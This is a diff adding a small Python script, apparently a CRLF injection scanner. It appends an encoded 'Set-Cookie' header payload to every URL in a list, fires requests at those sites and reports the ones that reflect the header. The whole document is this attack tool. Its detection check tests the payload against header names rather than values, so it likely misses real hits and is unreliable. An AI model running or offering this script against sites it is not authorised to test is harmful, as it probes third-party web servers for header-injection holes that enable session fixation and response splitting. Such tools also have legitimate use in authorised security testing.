@@ -1,0 +1,34 @@
+#!/bin/python3
+import sys
+import requests
+
+if len(sys.argv) < 2:
+	print("crlf_injector <urlfile>")
+	exit()
+
+urlfile = open(sys.argv[1], 'r')
+urls = urlfile.readlines()
+
+def inject(url):
+	url += "%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+	
+	#print("URL:%s" % url)
+	
+	try:
+		response = requests.get(url)
+		if "crlfinjection=crlfinjection" in response.headers:
+			print("URL:%s" % url)
+			print("BINGO:%s <===================" %response.headers)
+	except Exception as e:
+		#print("Error: %s" % str(e))
+		pass
+
+for url in urls:
+	url = url.strip()
+	if not url.endswith("/"):
+		url += "/"
+
+	inject(url)
+	#inject(url+"?")
+	inject(url+"?a=")
+	
